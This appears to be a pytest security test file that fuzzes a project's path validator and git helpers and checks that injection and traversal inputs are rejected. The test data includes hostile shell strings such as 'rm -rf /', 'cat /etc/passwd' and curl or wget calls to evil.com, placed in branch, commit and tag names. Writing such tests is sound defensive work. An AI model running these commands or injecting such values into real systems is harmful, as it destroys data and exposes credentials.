"""
Fuzzing Tests for Security

Automated fuzzing tests that attempt various malicious inputs
to discover potential vulnerabilities.

These tests use random generation to create thousands of malicious
inputs and verify they are all properly rejected.
"""

import pytest
import random
import string
from pathlib import Path
import tempfile

from specpulse.utils.path_validator import PathValidator, SecurityError
from specpulse.utils.git_utils import GitUtils, GitSecurityError


class TestFuzzingPathValidator:
    """Fuzzing tests for PathValidator"""

    def test_fuzz_random_special_characters(self):
        """Generate 1000 random inputs with special characters"""
        special_chars = '!@#$%^&*()[]{}|\\;:"\',<>?/`~'

        for _ in range(1000):
            # Generate random string with special chars
            length = random.randint(1, 100)
            random_str = ''.join(
                random.choice(string.ascii_letters + special_chars)
                for _ in range(length)
            )

            # Most should fail (only alphanumeric, hyphen, underscore allowed)
            try:
                result = PathValidator.validate_feature_name(random_str)
                # If it passes, verify it contains only allowed chars
                assert PathValidator.ALLOWED_CHARS.match(result)
            except (ValueError, SecurityError):
                # Expected for most random inputs
                pass

    def test_fuzz_path_traversal_combinations(self):
        """Generate various path traversal combinations"""
        patterns = ['../', '.\\', '../', '..\\']
        prefixes = ['', 'legit-', 'test-']
        suffixes = ['', '-feature', '-test']

        for pattern in patterns:
            for prefix in prefixes:
                for suffix in suffixes:
                    malicious = f"{prefix}{pattern}{suffix}"

                    with pytest.raises((ValueError, SecurityError)):
                        PathValidator.validate_feature_name(malicious)

    def test_fuzz_long_inputs(self):
        """Test with various long inputs"""
        for length in [100, 255, 256, 500, 1000, 10000]:
            long_input = 'a' * length

            if length <= 255:
                # Should pass (at limit or under)
                result = PathValidator.validate_feature_name(long_input)
                assert result == long_input
            else:
                # Should fail (over limit)
                with pytest.raises(ValueError, match="too long"):
                    PathValidator.validate_feature_name(long_input)

    def test_fuzz_unicode_input(self):
        """Test with various unicode characters"""
        unicode_ranges = [
            (0x0080, 0x00FF),  # Latin-1 Supplement
            (0x0100, 0x017F),  # Latin Extended-A
            (0x4E00, 0x4E10),  # CJK Unified Ideographs (sample)
            (0x0600, 0x0610),  # Arabic (sample)
        ]

        for start, end in unicode_ranges:
            for code_point in range(start, end):
                test_char = chr(code_point)
                test_name = f"test{test_char}name"

                # All unicode should fail (only ASCII alphanumeric allowed)
                with pytest.raises(ValueError, match="invalid characters"):
                    PathValidator.validate_feature_name(test_name)

    def test_fuzz_mixed_valid_invalid(self):
        """Fuzz test with mix of valid and invalid characters"""
        for _ in range(100):
            valid_part = ''.join(random.choices(string.ascii_lowercase + '-_', k=10))
            invalid_part = random.choice(['../', ';rm', '|cat', '$USER', '`whoami`'])

            malicious = f"{valid_part}{invalid_part}"

            with pytest.raises((ValueError, SecurityError)):
                PathValidator.validate_feature_name(malicious)


class TestFuzzingGitOperations:
    """Fuzzing tests for git operations"""

    @pytest.fixture
    def git_repo(self):
        """Create temporary git repository"""
        with tempfile.TemporaryDirectory() as tmpdir:
            repo_path = Path(tmpdir)
            git = GitUtils(repo_path)
            git.init_repo()

            test_file = repo_path / "test.txt"
            test_file.write_text("test")
            git.add_files(["test.txt"])
            git.commit("Initial commit")

            yield git

    def test_fuzz_branch_names(self, git_repo):
        """Fuzz branch names with various malicious patterns"""
        shell_patterns = [
            '; rm -rf /',
            '&& cat /etc/passwd',
            '| whoami',
            '$(curl evil.com)',
            '`wget evil.com`',
            '\n\nrm -rf /\n',
        ]

        for _ in range(100):
            # Random valid prefix
            prefix = ''.join(random.choices(string.ascii_lowercase, k=5))

            # Add malicious pattern
            malicious_pattern = random.choice(shell_patterns)
            malicious_branch = f"{prefix}{malicious_pattern}"

            with pytest.raises(GitSecurityError):
                git_repo.create_branch(malicious_branch)

    def test_fuzz_commit_messages(self, git_repo):
        """Fuzz commit messages with various malicious patterns"""
        # Create file to commit
        test_file = git_repo.repo_path / "fuzz.txt"

        for i in range(50):
            test_file.write_text(f"content {i}")
            git_repo.add_files(["fuzz.txt"])

            malicious_patterns = [
                f"Commit {i} $(rm -rf /)",
                f"Message {i} `curl evil.com/steal.sh`",
                f"Commit\x00{i}\x00malicious",
            ]

            malicious_msg = random.choice(malicious_patterns)

            with pytest.raises(GitSecurityError):
                git_repo.commit(malicious_msg)

    def test_fuzz_tag_names(self, git_repo):
        """Fuzz tag names with malicious patterns"""
        for i in range(50):
            malicious_tags = [
                f"v{i}.0; rm -rf /",
                f"release{i}$(whoami)",
                f"tag{i}`cat /etc/passwd`",
            ]

            malicious_tag = random.choice(malicious_tags)

            with pytest.raises(GitSecurityError):
                git_repo.tag(malicious_tag)


class TestExtremeEdgeCases:
    """Extreme edge cases that might be missed"""

    def test_empty_string(self):
        """Test empty string input"""
        with pytest.raises(ValueError, match="cannot be empty"):
            PathValidator.validate_feature_name("")

    def test_only_dots(self):
        """Test strings with only dots"""
        with pytest.raises((ValueError, SecurityError)):
            PathValidator.validate_feature_name("...")

        with pytest.raises((ValueError, SecurityError)):
            PathValidator.validate_feature_name("....")

    def test_only_slashes(self):
        """Test strings with only slashes"""
        with pytest.raises(SecurityError):
            PathValidator.validate_feature_name("///")

        with pytest.raises(SecurityError):
            PathValidator.validate_feature_name("\\\\\\")

    def test_mixed_case_injection(self):
        """Test case variations of injection patterns"""
        variations = [
            "Branch; RM -RF /",
            "FEATURE && CAT /etc/passwd",
            "Test | WHOAMI",
        ]

        for variation in variations:
            with pytest.raises((ValueError, SecurityError)):
                PathValidator.validate_feature_name(variation)

    def test_url_encoded_injection(self):
        """Test URL-encoded malicious patterns"""
        # %2e%2e%2f = ../
        with pytest.raises((ValueError, SecurityError)):
            PathValidator.validate_feature_name("%2e%2e%2f")

    def test_double_encoding(self):
        """Test double-encoded patterns"""
        # %252e = %2e (double encoded dot)
        with pytest.raises((ValueError, SecurityError)):
            PathValidator.validate_feature_name("%252e%252e%252f")

    def test_whitespace_variations(self):
        """Test various whitespace characters"""
        whitespace_chars = [' ', '\t', '\n', '\r', '\v', '\f']

        for ws in whitespace_chars:
            test_name = f"test{ws}name"

            with pytest.raises((ValueError, SecurityError)):
                PathValidator.validate_feature_name(test_name)

    def test_null_byte_variations(self):
        """Test null byte injection in various positions"""
        positions = [
            "\x00prefix",  # Start
            "middle\x00name",  # Middle
            "suffix\x00",  # End
            "\x00\x00multiple\x00\x00",  # Multiple
        ]

        for test_name in positions:
            with pytest.raises((ValueError, SecurityError)):
                PathValidator.validate_feature_name(test_name)


class TestSecurityRegression:
    """Tests to prevent security regressions"""

    def test_no_shell_true_in_subprocess(self):
        """
        Verify that subprocess calls never use shell=True
        This is a regression test for TASK-002
        """
        import subprocess
        import inspect

        # Get GitUtils source code
        git_utils_module = inspect.getmodule(GitUtils)
        source = inspect.getsource(git_utils_module)

        # Verify no shell=True usage
        assert 'shell=True' not in source, (
            "REGRESSION: shell=True detected in GitUtils. "
            "This is a critical security vulnerability."
        )

    def test_no_yaml_unsafe_load(self):
        """
        Verify that yaml.load() is never used (only yaml.safe_load())
        """
        import yaml
        from pathlib import Path

        # Check all Python files in specpulse/
        project_root = Path(__file__).parent.parent.parent
        specpulse_dir = project_root / "specpulse"

        unsafe_files = []

        for py_file in specpulse_dir.rglob("*.py"):
            if '__pycache__' in str(py_file):
                continue

            content = py_file.read_text()

            # Check for unsafe yaml.load()
            if 'yaml.load(' in content and 'yaml.safe_load(' not in content:
                # Check if it's actually yaml.load (not safe_load)
                import re
                matches = re.findall(r'yaml\.load\([^)]*\)', content)
                for match in matches:
                    if 'Loader=yaml.SafeLoader' not in match:
                        unsafe_files.append(py_file)

        assert len(unsafe_files) == 0, (
            f"REGRESSION: Unsafe yaml.load() found in: {unsafe_files}"
        )


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
